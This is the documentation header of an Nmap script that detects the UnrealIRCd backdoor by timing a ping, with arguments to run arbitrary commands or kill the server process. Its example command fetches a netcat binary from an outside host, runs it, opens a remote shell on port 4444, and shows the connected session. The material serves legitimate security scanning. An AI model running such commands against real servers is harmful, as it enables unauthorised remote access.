description = [[
Checks if an IRC server is backdoored by running a time-based command (ping)
and checking how long it takes to respond.

The <code>irc-unrealircd-backdoor.command</code> script argument can be used to
run an arbitrary command on the remote system. Because of the nature of
this vulnerability (the output is never returned) we have no way of
getting the output of the command. It can, however, be used to start a
netcat listener as demonstrated here:
<code>
  $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
  $ ncat -vv localhost 4444
  Ncat: Version 5.30BETA1 ( http://nmap.org/ncat )
  Ncat: Connected to 127.0.0.1:4444.
  pwd
  /home/ron/downloads/Unreal3.2-bad
  whoami
  ron
</code>

Metasploit can also be used to exploit this vulnerability.

In addition to running arbitrary commands, the
<code>irc-unrealircd-backdoor.kill</code> script argument can be passed, which
simply kills the UnrealIRCd process.

-- @args irc-unrealircd-backdoor.command An arbitrary command to run on the remote system (note, however, that you won't see the output of your command). This will always be attempted, even if the host isn't vulnerable. The pattern <code>%IP%</code> will be replaced with the ip address of the target host.
-- @args irc-unrealircd-backdoor.kill If set to <code>1</code> or <code>true</code>, kill the backdoored UnrealIRCd running.
-- @args irc-unrealircd-backdoor.wait Wait time in seconds before executing the check. This is recommended to set for more reliable check (100 is good value).
